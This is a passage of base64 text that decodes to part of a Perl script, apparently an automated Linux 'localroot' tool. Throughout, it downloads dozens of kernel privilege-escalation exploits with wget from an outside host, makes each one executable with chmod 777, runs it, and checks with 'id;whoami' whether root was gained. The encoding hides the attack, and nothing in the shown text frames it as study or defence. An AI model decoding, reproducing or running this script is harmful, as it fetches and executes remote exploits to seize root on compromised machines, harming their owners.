tKCJjaG1vZCA3NzcgMi42LjM0LTIwMTFFeHBsb2l0MSIpOw0Kc3lzdGVtKCIuLzIuNi4zNC0yMDExRXhwbG9pdDEiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjM0LTIwMTFFeHBsb2l0MiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjM0LTIwMTFFeHBsb2l0MiIpOw0Kc3lzdGVtKCIuLzIuNi4zNC0yMDExRXhwbG9pdDIiKTsNCnN5c3RlbSgiaWQ7d2hvYW1pIik7DQpwcmludCAiSWYgdSBnZXQgcm9vdCBzdG9wIGl0IHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjM3Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzciKTsNCnN5c3RlbSgiLi8yLjYuMTgtMjAxMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMzctcmMyIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzctcmMyIik7DQpzeXN0ZW0oIi4vMi42LjM3LXJjMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNV9ob29seXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi41X2hvb2x5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi41X2hvb2x5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNi0zNCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjYtMzQiKTsNCnN5c3RlbSgiLi8yLjYuNi0zNCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNi0zNF9oMDBseXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi42LTM0X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi42LTM0X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNl9oMDBseXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi42X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi42X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuN19oMDBseXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi43X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi43X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOC0yMDA4LjktNjctMjAwOCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjgtMjAwOC45LTY3LTIwMDgiKTsNCnN5c3RlbSgiLi8yLjYuOC0yMDA4LjktNjctMjAwOCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOC01X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjgtNV9oMDBseXNoaXQiKTsNCnN5c3RlbSgiLi8yLjYuOC01X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOF9oMDBseXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi44X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi44X2gwMGx5c2hpdCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjkiKTsNCnN5c3RlbSgiLi8yLjYuOSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS0yMDA0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS0yMDA0Iik7DQpzeXN0ZW0oIi4vMi42LjktMjAwNCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS0yMDA4Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS0yMDA4Iik7DQpzeXN0ZW0oIi4vMi42LjktMjAwOCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS0zNCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktMzQiKTsNCnN5c3RlbSgiLi8yLjYuOS0zNCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS00Mi4wLjMuRUxzbXAiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTQyLjAuMy5FTHNtcCIpOw0Kc3lzdGVtKCIuLzIuNi45LTQyLjAuMy5FTHNtcCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS00Mi4wLjMuRUxzbXAtMjAwNiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktNDIuMC4zLkVMc21wLTIwMDYiKTsNCnN5c3RlbSgiLi8yLjYuOS00Mi4wLjMuRUxzbXAtMjAwNiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS01NSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktNTUiKTsNCnN5c3RlbSgiLi8yLjYuOS01NSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS01NS0yMDA3LXBydjgiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTU1LTIwMDctcHJ2OCIpOw0Kc3lzdGVtKCIuLzIuNi45LTU1LTIwMDctcHJ2OCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS01NS0yMDA4LXBydjgiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTU1LTIwMDgtcHJ2OCIpOw0Kc3lzdGVtKCIuLzIuNi45LTU1LTIwMDgtcHJ2OCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS02NzIwMDgiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTY3MjAwOCIpOw0Kc3lzdGVtKCIuLzIuNi45LTY3MjAwOCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS4yIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS4yIik7DQpzeXN0ZW0oIi4vMi42LjkuMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOTEtMjAwNyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMi42LjkxLTIwMDciKTsNCnN5c3RlbSgiLi8yLjYuOTEtMjAwNyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMDA3Iik7DQpzeXN0ZW0oImNobW9kIDc3NyAyMDA3Iik7DQpzeXN0ZW0oIi4vMjAwNyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMDA5LWxvY2FsIik7DQpzeXN0ZW0oImNobW9kIDc3NyAyMDA5LWxvY2FsIik7DQpzeXN0ZW0oIi4vMjAwOS1sb2NhbCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMDA5LXd1bmRlcmJhciIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMjAwOS13dW5kZXJiYXIiKTsNCnN5c3RlbSgiLi8yMDA5LXd1bmRlcmJhciIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMDExIExvY2FsUm9vdCBGb3IgMi42LjE4LTEyOC5lbDUiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDIwMTEgTG9jYWxSb290IEZvciAyLjYuMTgtMTI4LmVsNSIpOw0Kc3lzdGVtKCIuLzIwMTEgTG9jYWxSb290IEZvciAyLjYuMTgtMTI4LmVsNSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMjEiKTsNCnN5c3RlbSgiLi8yMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zIik7DQpzeXN0ZW0oImNobW9kIDc3NyAzIik7DQpzeXN0ZW0oIi4vMyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zLjQuNi05LTIwMDciKTsNCnN5c3RlbSgiY2htb2QgNzc3IDMuNC42LTktMjAwNyIpOw0Kc3lzdGVtKCIuLzMuNC42LTktMjAwNyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zMSIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgMzEiKTsNCnN5c3RlbSgiLi8zMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zNi1yYzEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDM2LXJjMSIpOw0Kc3lzdGVtKCIuLzM2LXJjMSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC80Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA0Iik7DQpzeXN0ZW0oIi4vNCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC80NCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNDQiKTsNCnN5c3RlbSgiLi80NCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC80NyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNDciKTsNCnN5c3RlbSgiLi80NyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC81Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA1Iik7DQpzeXN0ZW0oIi4vNSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC81MCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNTAiKTsNCnN5c3RlbSgiLi81MCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC81NCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNTQiKTsNCnN5c3RlbSgiLi81NCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC82Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA2Iik7DQpzeXN0ZW0oIi4vNiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC82NyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgNjciKTsNCnN5c3RlbSgiLi82NyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC83Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA3Iik7DQpzeXN0ZW0oIi4vNyIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC83LTIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IDctMiIpOw0Kc3lzdGVtKCIuLzctMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC83eCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgN3giKTsNCnN5c3RlbSgiLi83eCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC84Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA4Iik7DQpzeXN0ZW0oIi4vOCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC85Iik7DQpzeXN0ZW0oImNobW9kIDc3NyA5Iik7DQpzeXN0ZW0oIi4vOSIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC85MCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgOTAiKTsNCnN5c3RlbSgiLi85MCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC85NCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgOTQiKTsNCnN5c3RlbSgiLi85NCIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9MaW51eF8yLjYoMSkuMTIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IExpbnV4XzIuNigxKS4xMiIpOw0Kc3lzdGVtKCIuL0xpbnV4XzIuNigxKS4xMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9MaW51eF8yLjYuMTIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IExpbnV4XzIuNi4xMiIpOw0Kc3lzdGVtKCIuL0xpbnV4XzIuNi4xMiIpOw0Kc3lzdGVtKCJpZDt3aG9hbWkiKTsNCnByaW50ICJJZiB1IGdldCByb290IHN0b3AgaXQgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9MaW51eF8yLjYuOS1qb29seXNoaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IExpbnV4XzIuNi45LWpvb2x5c2hpdCIpOw0Kc3lzdGVtKCIuLzIuNi4xOC0yMDExIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2FjaWQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGFjaWQiKTsNCnN5c3RlbSgiLi9hY2lkIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2QzdmlsIik7DQpzeXN0ZW0oImNobW9kIDc3NyBkM3ZpbCIpOw0Kc3lzdGVtKCIuL2QzdmlsIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2V4cDEiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGV4cDEiKTsNCnN5c3RlbSgiLi9leHAxIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2V4cDIiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGV4cDIiKTsNCnN5c3RlbSgiLi9leHAyIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2V4cDMiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGV4cDMiKTsNCnN5c3RlbSgiLi9leHAzIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2V4cGxvaXQiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGV4cGxvaXQiKTsNCnN5c3RlbSgiLi9leHBsb2l0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2Z1bGwtbmVsc29uIik7DQpzeXN0ZW0oImNobW9kIDc3NyBmdWxsLW5lbHNvbiIpOw0Kc3lzdGVtKCIuL2Z1bGwtbmVsc29uIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2dheXJvcyIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgZ2F5cm9zIik7DQpzeXN0ZW0oIi4vZ2F5cm9zIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2xlbmlzLnNoIik7DQpzeXN0ZW0oImNobW9kIDc3NyBsZW5pcy5zaCIpOw0Kc3lzdGVtKCIuL2xlbmlzLnNoIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2xvY2FsLTIuNi45LTIwMDUtMjAwNiIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgbG9jYWwtMi42LjktMjAwNS0yMDA2Iik7DQpzeXN0ZW0oIi4vbG9jYWwtMi42LjktMjAwNS0yMDA2Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2xvY2FsLXJvb3QtZXhwbG9pdC1nYXlyb3MiKTsNCnN5c3RlbSgiY2htb2QgNzc3IGxvY2FsLXJvb3QtZXhwbG9pdC1nYXlyb3MiKTsNCnN5c3RlbSgiLi9sb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3ByaXY0Iik7DQpzeXN0ZW0oImNobW9kIDc3NyBwcml2NCIpOw0Kc3lzdGVtKCIuL3ByaXY0Iik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3B3bmtlcm5lbCIpOw0Kc3lzdGVtKCJjaG1vZCA3NzcgcHdua2VybmVsIik7DQpzeXN0ZW0oIi4vcHdua2VybmVsIik7DQpzeXN0ZW0oImlkO3dob2FtaSIpOw0KcHJpbnQgIklmIHUgZ2V0IHJvb3Qgc3RvcCBpdCB3aXRoIGN0cmwrY1xuIjs